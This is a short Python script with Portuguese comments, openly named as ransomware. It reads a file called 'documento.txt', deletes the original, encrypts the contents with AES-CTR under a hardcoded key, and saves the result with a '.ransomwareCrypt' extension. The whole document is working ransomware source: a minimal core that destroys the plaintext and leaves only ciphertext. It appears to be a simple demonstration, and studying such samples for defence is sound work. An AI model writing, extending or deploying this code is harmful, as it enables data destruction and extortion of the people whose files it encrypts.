import os
import pyaes


# Abrir o arquivo a ser criptografado

nome_do_arquivo = 'documento.txt'
arquivo = open(nome_do_arquivo, 'rb')
dado_do_arquivo = arquivo.read()
arquivo.close()


# Remover o arquivo original

os.remove(nome_do_arquivo)


# Definir a chave de encriptacao

chave = b"chaveRansomwares"
aes = pyaes.AESModeOfOperationCTR(chave)


# Criptografar o arquivo

dado_criptografado = aes.encrypt(dado_do_arquivo)


# Salvar o arquivo criptografado

novo_arquivo = nome_do_arquivo + '.ransomwareCrypt'
novo_arquivo = open(f'{novo_arquivo}','wb')
novo_arquivo.write(dado_criptografado)
novo_arquivo.close()
